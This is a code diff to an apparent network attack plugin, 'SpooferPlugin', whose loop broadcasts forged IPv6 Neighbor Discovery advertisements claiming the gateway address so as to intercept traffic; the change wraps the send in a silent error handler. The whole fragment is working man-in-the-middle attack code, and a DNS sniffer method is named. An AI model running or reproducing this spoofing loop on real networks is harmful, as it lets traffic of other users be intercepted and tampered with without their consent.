@@ -98,9 +98,11 @@ class SpooferPlugin(BasePlugin):
     def _ndp_loop(self):
         """Spoof Neighbor Discovery Protocol for IPv6 MITM."""
         while self.running:
-            # Broadcast "I am the default gateway" for IPv6
-            pkt = IPv6(dst="ff02::1")/ICMPv6ND_NA(tgt="fe80::1", R=0, S=0, O=1)/ICMPv6NDOptDstLLAddr(lladdr="ff:ff:ff:ff:ff:ff")
-            send(pkt, verbose=False)
+            try:
+                pkt = IPv6(dst="ff02::1")/ICMPv6ND_NA(tgt="fe80::1", R=0, S=0, O=1)/ICMPv6NDOptDstLLAddr(lladdr="ff:ff:ff:ff:ff:ff")
+                send(pkt, verbose=False)
+            except Exception:
+                pass
             time.sleep(5)
 
     def _dns_sniffer(self):
